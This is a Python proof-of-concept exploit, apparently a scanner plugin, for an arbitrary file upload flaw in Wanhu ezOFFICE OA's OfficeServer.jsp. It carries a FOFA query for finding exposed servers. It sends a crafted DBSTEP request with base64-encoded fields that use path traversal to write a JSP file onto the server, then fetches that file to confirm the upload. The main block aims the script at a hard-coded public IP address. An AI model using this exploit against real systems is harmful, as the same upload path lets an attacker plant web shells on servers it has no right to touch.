#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
'''
_/_/_/_/_/                                          
   _/      _/  _/_/    _/_/_/  _/_/_/      _/_/_/   
  _/      _/_/      _/    _/  _/    _/  _/_/        
 _/      _/        _/    _/  _/    _/      _/_/     
_/      _/          _/_/_/  _/    _/  _/_/_/        
                                               
'''

import json
import requests
#from Config.config_requests import ua


# 脚本信息
######################################################
NAME='OfficeServerFileUpload'
AUTHOR="Trans"
REMARK='万户OA OfficeServer.jsp 任意文件上传漏洞'
FOFA_RULE='app="万户网络-ezOFFICE"'
######################################################

def poc(target):
    headers ={
        "User-Agent":"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate"
    }

    try:
        target2 = target+"/defaultroot/public/edit/cmd_test.jsp"
        target += "/defaultroot/public/iWebOfficeSign/OfficeServer.jsp"
        FileData = '<%= "hellowOrld"%>'
        Body="DBSTEP=REJTVEVQ\r\nOPTION=U0FWRUZJTEU=\r\nRECORDID=\r\nisDoc=dHJ1ZQ==\r\nmoduleType=Z292ZG9jdW1lbnQ=\r\nFILETYPE=Li4vLi4vcHVibGljL2VkaXQvY21kX3Rlc3QuanNw\r\n111111111111111111111111111111111111111111111111\r\n"
        Header="DBSTEP V3.0     "+str(len(Body)).ljust(16,' ') +"0               "+str(len(FileData)).ljust(16,' ')
        r = requests.post(target ,headers = headers,data=Header+Body+FileData,verify=False,timeout=40)
        r2 = requests.get(target2)
        if r2.text == "hellowOrld":
                print('[+] ' + target + ' 存在OfficeServer.jsp 任意文件上传漏洞')
                #return ('[+] ' + target + '  存在OfficeServer.jsp 任意文件上传漏洞')
    except Exception as e:
         pass

def pocs(target,q):
    q.put(target)
    return poc(target)


if __name__ == '__main__':
    poc("http://183.129.227.222")
